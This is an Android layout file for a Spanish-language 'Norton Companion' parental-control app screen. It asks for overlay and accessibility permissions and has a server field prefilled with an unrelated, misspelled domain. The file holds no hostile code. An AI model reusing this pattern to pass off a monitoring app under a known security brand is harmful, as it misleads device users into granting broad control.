<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#0B0F19"
    android:padding="24dp"
    android:gravity="center_horizontal">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="🛡️"
        android:textSize="50sp"
        android:layout_marginTop="20dp"
        android:layout_marginBottom="12dp" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Norton Companion"
        android:textSize="22sp"
        android:textStyle="bold"
        android:textColor="#FFFFFF" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Agente Nativo de Control Parental"
        android:textSize="13sp"
        android:textColor="#FFB800"
        android:layout_marginBottom="24dp" />

    <TextView
        android:id="@+id/tv_status"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="#161F30"
        android:textColor="#10B981"
        android:text="● Servicio Conectado a Servidor"
        android:textStyle="bold"
        android:textSize="13sp"
        android:padding="14dp"
        android:layout_marginBottom="16dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="1. Permiso de Superposición (Tapar YouTube/Apps):"
        android:textColor="#94A3B8"
        android:textSize="12sp"
        android:layout_marginBottom="6dp" />

    <Button
        android:id="@+id/btn_overlay_perm"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Conceder Superposición de Pantalla"
        android:backgroundTint="#FFB800"
        android:textColor="#000000"
        android:textStyle="bold"
        android:layout_marginBottom="16dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="2. Permiso de Accesibilidad (Detección de Apps):"
        android:textColor="#94A3B8"
        android:textSize="12sp"
        android:layout_marginBottom="6dp" />

    <Button
        android:id="@+id/btn_accessibility_perm"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Activar Servicio de Accesibilidad"
        android:backgroundTint="#161F30"
        android:textColor="#FFFFFF"
        android:layout_marginBottom="16dp" />

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Dirección del Servidor:"
        android:textColor="#94A3B8"
        android:textSize="12sp"
        android:layout_marginBottom="4dp" />

    <EditText
        android:id="@+id/et_server_url"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:background="#161F30"
        android:textColor="#FFFFFF"
        android:textSize="13sp"
        android:padding="12dp"
        android:text="https://segurity.appzplay.online"
        android:layout_marginBottom="16dp" />

    <Button
        android:id="@+id/btn_test_lock"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Probar Pantalla de Bloqueo"
        android:backgroundTint="#EF4444"
        android:textColor="#FFFFFF"
        android:textStyle="bold" />

</LinearLayout>
